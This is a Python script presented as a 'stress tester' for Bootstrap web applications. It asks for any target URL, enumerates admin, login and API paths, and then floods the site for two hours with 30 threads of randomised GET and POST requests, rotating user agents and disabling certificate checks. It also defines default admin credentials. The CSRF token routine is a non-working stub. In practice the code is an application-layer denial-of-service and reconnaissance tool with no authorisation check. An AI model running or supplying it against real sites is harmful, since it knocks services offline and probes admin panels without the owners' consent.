import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class BootstrapTester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # Common Bootstrap admin panel and component endpoints
        self.endpoints = [
            "admin",
            "dashboard",
            "login",
            "admin/dashboard",
            "admin/login",
            "api/v1/auth",
            "api/v1/users",
            "api/v1/settings",
            "components",
            "assets/js/bootstrap.min.js",
            "assets/css/bootstrap.min.css",
            "admin/components",
            "admin/settings",
            "admin/users",
            "admin/profile",
            "api/auth/login",
            "api/auth/register"
        ]
        self.payloads = {
            "auth_test": {
                "username": "admin",
                "password": "admin123",
                "remember": True
            },
            "component_test": {
                "type": "modal",
                "title": "Test Modal",
                "content": "Test Content",
                "size": "lg"
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def verify_endpoint(self, url, endpoint):
        """Verify endpoint availability before testing"""
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        try:
            response = requests.head(
                full_url,
                headers={"User-Agent": self.get_random_user_agent()},
                timeout=3,
                verify=False,
                allow_redirects=True
            )
            return 200 <= response.status_code < 404
        except:
            return False

    def discover_valid_endpoints(self, url):
        """Discover valid Bootstrap-related endpoints"""
        print("[INFO] Discovering valid Bootstrap endpoints...")
        valid_endpoints = []
        
        # Add Bootstrap-specific endpoint discovery
        additional_endpoints = [
            "css/bootstrap.min.css",
            "js/bootstrap.min.js",
            "js/bootstrap.bundle.min.js",
            "admin/templates",
            "admin/themes",
            "admin/plugins",
            "api/components",
            "api/themes",
            "api/templates",
            "bootstrap",
            "bootstrap/js",
            "bootstrap/css",
            "dist/js/bootstrap.min.js",
            "dist/css/bootstrap.min.css"
        ]
        
        self.endpoints.extend(additional_endpoints)
        
        for endpoint in self.endpoints:
            if self.verify_endpoint(url, endpoint):
                print(f"[SUCCESS] Found valid endpoint: {endpoint}")
                valid_endpoints.append(endpoint)
        
        if not valid_endpoints:
            print("[WARNING] No valid endpoints found. Using default endpoints.")
            return self.endpoints
        
        return valid_endpoints

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        # Add Bootstrap-specific headers
        additional_headers = {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty"
        }
        self.headers.update(additional_headers)
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            else:
                if data:
                    data["csrf_token"] = self.get_csrf_token(url)
                
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            if response.status_code in [404, 403]:
                return None
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def get_csrf_token(self, url):
        """Get CSRF token from the Bootstrap application"""
        try:
            response = requests.get(
                f"{url.rstrip('/')}/login",
                headers={"User-Agent": self.get_random_user_agent()},
                verify=False
            )
            # Implementation for token extraction from response
            # Token usually found in meta tags or form fields
            return "dummy_token"  # Replace with actual implementation
        except:
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
        
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            print("[ERROR] No valid endpoints found. Aborting test.")
            return
            
        self.endpoints = valid_endpoints
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("component_test") if method == "POST" else None
                result = self.send_request(method, url, endpoint, data=payload)
                if result:
                    time.sleep(random.uniform(0.1, 0.3))
                else:
                    time.sleep(random.uniform(0.5, 1.0))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Enter target Bootstrap application URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = BootstrapTester()
        tester.flood(target_url, workers=30, duration=7200)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
